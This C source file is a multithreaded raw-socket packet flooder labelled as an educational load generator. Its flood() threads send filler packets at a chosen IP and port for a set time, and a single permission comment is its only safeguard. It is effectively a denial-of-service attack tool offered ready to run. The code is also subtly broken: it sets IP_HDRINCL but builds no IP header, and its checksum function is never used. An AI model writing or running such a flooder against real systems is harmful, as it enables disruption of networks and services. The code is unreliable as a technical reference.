// Network Load Generator for Educational Purposes
// Only use on networks you own or have explicit permission to test.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

// Structure for passing arguments to threads
typedef struct {
    char ip[16];
    int port;
    int duration;
} ThreadArgs;

// Function to create a raw socket
int create_raw_socket() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    int one = 1;
    const int *val = &one;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("setsockopt");
        close(sock);
        return -1;
    }
    return sock;
}

// Function to calculate the checksum
unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *) &oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short) ~sum;

    return answer;
}

// Define thread function for sending packets
void *flood(void *args) {
    ThreadArgs *threadArgs = (ThreadArgs *)args;

    // Set up the socket
    int sock = create_raw_socket();
    if (sock < 0) {
        perror("Socket error");
        pthread_exit(NULL);
    }

    // Specify the target address
    struct sockaddr_in targetAddr;
    memset(&targetAddr, 0, sizeof(targetAddr));
    targetAddr.sin_family = AF_INET;
    targetAddr.sin_port = htons(threadArgs->port);
    if (inet_pton(AF_INET, threadArgs->ip, &targetAddr.sin_addr) <= 0) {
        perror("Invalid IP address");
        pthread_exit(NULL);
    }

    // Automatically set packet size and delay
    int packet_size = 2048; // Default packet size
    int delay_us = 1000;    // Default delay (in microseconds)

    // Create a buffer for the packet data
    char data[packet_size];
    memset(data, 'X', sizeof(data));

    // Time tracking
    time_t start = time(NULL);
    while (time(NULL) - start < threadArgs->duration) {
        // Send packet
        if (sendto(sock, data, sizeof(data), 0, (struct sockaddr *)&targetAddr, sizeof(targetAddr)) < 0) {
            perror("Sendto error");
        }
        usleep(delay_us); // Delay in microseconds
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char **argv) {
    // Validate arguments
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
        return 1;
    }

    // Parse arguments
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int timeDuration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    if (port <= 0 || port > 65535 || timeDuration <= 0 || threads <= 0) {
        printf("Invalid arguments. Please check the input.\n");
        return 1;
    }

    printf("Starting traffic generation:\n");
    printf("Target IP: %s\n", ip);
    printf("Target Port: %d\n", port);
    printf("Duration: %d seconds\n", timeDuration);
    printf("Threads: %d\n", threads);

    // Set up thread arguments
    ThreadArgs args;
    strncpy(args.ip, ip, 16);
    args.port = port;
    args.duration = timeDuration;

    // Create threads
    pthread_t threadPool[threads];
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&threadPool[i], NULL, flood, &args) != 0) {
            perror("Thread creation failed");
            return 1;
        }
    }

    // Wait for threads to finish
    for (int i = 0; i < threads; i++) {
        pthread_join(threadPool[i], NULL);
    }

    printf("Traffic generation complete.\n");
    return 0;
}